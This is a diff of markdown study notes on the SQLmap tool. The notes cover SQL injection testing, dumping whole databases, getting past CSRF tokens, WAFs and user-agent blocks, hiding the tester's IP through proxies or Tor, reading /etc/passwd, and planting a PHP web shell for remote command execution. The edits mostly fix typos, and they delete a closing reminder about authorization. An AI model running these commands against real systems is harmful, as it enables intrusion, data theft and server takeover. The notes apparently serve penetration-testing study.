@@ -1,10 +1,38 @@
-# SQLMAP Essentials
+# SQLmap
+
+These notes summarize core techniques for discovery and exploitation of SQL injection vulnerabilities using **SQLmap**. This is by no means an exhaustive guide. 
+
+---
+
+## Table of Contents
+
+- [Overview](#overview)
+- [Crafting HTTP Requests](#crafting-http-requests)
+  - [GET Requests](#get-requests)
+  - [POST Requests](#post-requests)
+  - [Parsing Requests From File](#parsing-requests-from-file)
+- [Attack Tuning](#attack-tuning)
+- [Injection Techniques](#injection-techniques)
+- [Database Enumeration](#database-enumeration)
+  - [Database Metadata](#database-metadata)
+  - [Database Tables, Columns and Rows](#database-tables-columns-and-rows)
+- [Bypassing Security Systems](#bypassing-security-systems)
+  - [Anti-CSRF Token Bypass](#anti-csrf-token-bypass)
+  - [Unique Value Bypass](#unique-value-bypass)
+  - [Calculated Parameter Bypass](#calculated-parameter-bypass)
+  - [IP Address Concealing](#ip-address-concealing)
+  - [WAF Bypass](#waf-bypass)
+  - [User-Agent Blacklisting Bypass](#user-agent-blacklisting-bypass)
+  - [Tamper Scripts](#tamper-scripts)
+- [OS Exploitation](#os-exploitation)
+  - [Reading Files](#reading-files)
+  - [Writing Files](#writing-files)
 
 ---
 
 ## Overview
 
-SQLmap is an automated tool designed to identify and exploit SQL injection vulnerabilities. It supports a wide range of database management systems and provides extensive functionality for database enumeration, data extraction, and post-exploitation.
+SQLmap is an automated tool designed to discover and exploit SQL injection vulnerabilities. It supports a wide range of database management systems and provides extensive functionality for database enumeration, data extraction, and post-exploitation.
 
 SQLmap includes two built-in help menus.
 
@@ -28,7 +56,7 @@ sqlmap -hh
 When testing GET parameters, parameters are supplied directly in the URL:
 
 ```bash
-sqlmap -u "http://www.example.com/vuln.php?id=1" –-batch
+sqlmap -u "http://www.example.com/vuln.php?id=1" --batch
 ```
 
 The **--batch** flag automatically selects default answers for prompts, enabling non-interactive execution.
@@ -49,7 +77,7 @@ sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'
 
 ### Parsing Requests From File
 
-Complex requests are best handled by parsing a raw HTTP request from a file. Capture a request in Burp Suite, mark injectable parameters with *, and save it:
+Complex requests are best handled by parsing a raw HTTP request from file. Capture a request in Burp Suite, mark injectable parameters with * and save it:
 
 ```bash
 sqlmap -r req.txt --batch
@@ -59,7 +87,7 @@ sqlmap -r req.txt --batch
 
 ## Attack Tuning
 
-SQLmap payloads consist of:
+SQLmap payloads are composed of:
 
 - Vector: The SQL code to be executed
 - Boundary: Characters surrounding the vector (quotes, comments, parentheses)
@@ -73,7 +101,7 @@ SQLmap uses a default payload set, which can be expanded using the following opt
 
 At default settings (--risk=1 --level=1), SQLmap generates 72 payloads per parameter. At maximum settings (--risk=3 --level=5), this increases to 7865 payloads.
 
-High values are recommended when testing authentication mechanisms:
+High values are often required when testing authentication mechanisms. But keep in mind that high **--risk** and **--level** values significantly increase noise and the likelihood of detection:
 
 ```bash
 sqlmap -r req.txt --risk=3 --level=5 --batch -v
@@ -83,7 +111,7 @@ sqlmap -r req.txt --risk=3 --level=5 --batch -v
 
 ## Injection Techniques
 
-SQLmap uses six different SQL-injection techniques, and a combination of all techniques is used by default. In certain situations it may be a good idea to tweak these settings.
+SQLmap attempts all supported injection techniques by default and automatically selects the most effective one for the target.
 
 SQLmap supports six SQL injection techniques, abbreviated BEUSTQ:
 
@@ -94,7 +122,7 @@ SQLmap supports six SQL injection techniques, abbreviated BEUSTQ:
 - Time-based blind (T)
 - Inline queries (Q)
 
-Specific techniques can be selected using the --technique flag:
+In certain situations it may be useful to tweak the injection settings. Specific techniques can be selected using the **--technique** flag:
 
 ```bash
 sqlmap -r req.txt --technique=BEU --batch
@@ -113,7 +141,7 @@ Common flags:
 | Flag              | Description                |
 | ----------------- | -------------------------- |
 | `--banner`        | `DBMS banner/version`      |
-| `--current-user`  | `DB user `                 |
+| `--current-user`  | `DB user`                  |
 | `--current-db`    | `DB name`                  |
 | `--is-dba`        | `Check for DBA privileges` |
 
@@ -178,7 +206,7 @@ Dump data from all tables from all DBs in the entire DBMS:
 sqlmap -r req.txt --dump-all --exclude-sysdbs --batch
 ```
 
-Retrieve the strucutre of each table in DB **testdb**:
+Retrieve the structure of each table in DB **testdb**:
 
 ```bash
 sqlmap -r req.txt --schema --batch
@@ -214,26 +242,26 @@ sqlmap -r req.txt --all --batch
 
 ### Anti-CSRF Token Bypass
 
-Anti CSRF-tokens is a defense against automated penetration testing tools. This requires each request to have a valid token, obtained by actually interacting with the web page.
+Anti CSRF-tokens are a defense against automated penetration testing tools. This requires each request to have a valid token, obtained by actually interacting with the web page.
 
 SQLmap can attempt to bypass this defense by passing the CSRF-token to the **--csrf-token** flag.
 
 **Example:**
 
 ```bash
-sqlmap -r req.txt –-csrf-token=”t0ken” -–batch
+sqlmap -r req.txt --csrf-token="t0ken" --batch
 ```
 
 ### Unique Value Bypass
 
-Applications sometimes require unique values to be provided to some GET or POST parameter. Such a protection mechanism is similar to anti-CSRF, but does not require the tool to actually parse content on the web page. By ensuring that each request has a unique value assigned to some parameter, the application can prevent CSRF-attempts and prevent some automated tools. 
+Applications sometimes require unique values to be provided to some GET or POST parameter. Such a protection mechanism is similar to anti-CSRF, but does not require the tool to actually parse content on the web page. By ensuring that each request has a unique value assigned to some parameter, the application can prevent CSRF attempts and prevent some automated tools. 
 
 SQLmap can attempt to bypass this security measure by providing the **--randomize** flag with the name of the parameter that holds the unique value.
 
 **Example:**
 
 ```bash
-sqlmap -r req.txt --randomize=rv –-batch
+sqlmap -r req.txt --randomize=rv --batch
 ```
 
 ### Calculated Parameter Bypass
@@ -250,7 +278,7 @@ sqlmap -r req.txt --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch
 
 ### IP Address Concealing
 
-A proxy server can be used to conceal ones IP address. 
+A proxy server can be used to conceal one's IP address. 
 
 A proxy server can be passed to the **--proxy** flag, or a list of proxy servers can be passed to the **--proxy-file** flag.
 
@@ -261,7 +289,7 @@ sqlmap -r req.txt --proxy="socks4://127.0.0.1:9050" --batch
 ```
 
 ```bash
-sqlmap -r req.txt --proxy-file="proxys.txt" –-batch
+sqlmap -r req.txt --proxy-file="proxys.txt" --batch
 ```
 
 An easier way to achieve anonymity is through the Tor network.
@@ -271,11 +299,11 @@ When using the **--tor** flag, SQLMap attempts to find and connect to the port r
 **Examples:**
 
 ```bash
-sqlmap -r req.txt –-tor –-batch
+sqlmap -r req.txt --tor --batch
 ```
 
 ```bash
-sqlmap -r req.txt –-tor –-check-tor –-batch
+sqlmap -r req.txt --tor --check-tor --batch
 ```
 
 ### WAF Bypass
@@ -285,7 +313,7 @@ By default, SQLmap sends a special payload to test for the existence of a WAF. M
 **Example:**
 
 ```bash
-sqlmap -r req.txt –-skip-waf –-batch
+sqlmap -r req.txt --skip-waf --batch
 ```
 
 ### User-Agent Blacklisting Bypass
@@ -295,7 +323,7 @@ The default SQLmap user-agent is blacklisted by many security systems. If you re
 **Example:**
 
 ```bash
-sqlmap -r req.txt –-random-agent –-batch
+sqlmap -r req.txt --random-agent --batch
 ```
 
 ### Tamper Scripts
@@ -307,19 +335,19 @@ Tamper scripts are Python scripts written for SQLmap. Tamper scripts are used to
 **List tamper scripts:**
 
 ```bash
-sqlmap –-list-tampers
+sqlmap --list-tampers
 ```
 
 **Use a tamper scripts:**
 
 ```bash
-sqlmap -r req.txt –-tamper=between
+sqlmap -r req.txt --tamper=between
 ```
 
 **Use multiple tamper scripts:**
 
 ```bash
-sqlmap -r req.txt –-tamper=between,randomcase,percentage
+sqlmap -r req.txt --tamper=between,randomcase,percentage
 ```
 
 ---
@@ -328,12 +356,12 @@ sqlmap -r req.txt –-tamper=between,randomcase,percentage
 
 ### Reading Files
 
-Reading and writing on a DBMS require certain privileges. Being able to read data is more common then being able to write data. DBA privileges are not always necessary in order to read data, but are an indication that read privileges are present. The **--is-dba** flag checks for DBA privileges.
+Reading and writing on a DBMS require certain privileges. Being able to read data is more common than being able to write data. DBA privileges are not always necessary in order to read data, but are an indication that read privileges are present. The **--is-dba** flag checks for DBA privileges.
 
 **Example:**
 
 ```bash
-sqlmap -r req.txt –-is-dba --batch
+sqlmap -r req.txt --is-dba --batch
 ```
 
 If one has the right privileges the **--file-read** flag can be used to read files and download them on the local system.
@@ -341,12 +369,12 @@ If one has the right privileges the **--file-read** flag can be used to read fil
 **Example:**
 
 ```bash
-sqlmap -r req.txt –-file-read "/etc/passwd"
+sqlmap -r req.txt --file-read "/etc/passwd"
 ```
 
 ### Writing Files
 
-Writing files if often restricted on modern DBMSs. However, if the attacker is granted these privileges, a web shell can be written to the server in order to gain remote code execution. 
+Writing files is often restricted on modern DBMSs. However, if the attacker is granted these privileges, a web shell can be written to the server in order to gain remote code execution. 
 
 The **--file-write** and **--file-dest** flags are used to write files to a server.
 
@@ -361,7 +389,7 @@ echo '<?php system($_GET["cmd"]); ?>' > shell.php
 Write web shell to server:
 
 ```bash
-sqlmap -r req.txt –-file-write "shell.php" –-file-dest "/var/www/html/shell.php"
+sqlmap -r req.txt --file-write "shell.php" --file-dest "/var/www/html/shell.php"
 ```
 
 Communicate with web shell:
@@ -375,20 +403,8 @@ SQLmap also has built-in shell capabilities.
 **Example:**
 
 ```bash
-sqlmap -r req.txt –-os-shell
+sqlmap -r req.txt --os-shell
 ```
-
----
-
-## Final Notes
-
-Used responsibly, SQLmap is one of the most effective tools for identifying and exploiting SQL injection vulnerabilities in modern web applications.
-
-- SQLmap is quite powerful and should be used deliberately. Running with high **--risk** and **--level** values can generate significant traffic and noise.
-- Favor request parsing (**-r**) for real-world applications, as it preserves headers, cookies, CSRF tokens, and request structure.
-- Start with minimal settings, then gradually increase aggressiveness once injection is confirmed.
-- Be mindful of scope and authorization. Only use SQLmap against systems you are explicitly permitted to test.
-- Review available tamper scripts when dealing with WAF-protected targets.
 
 
 
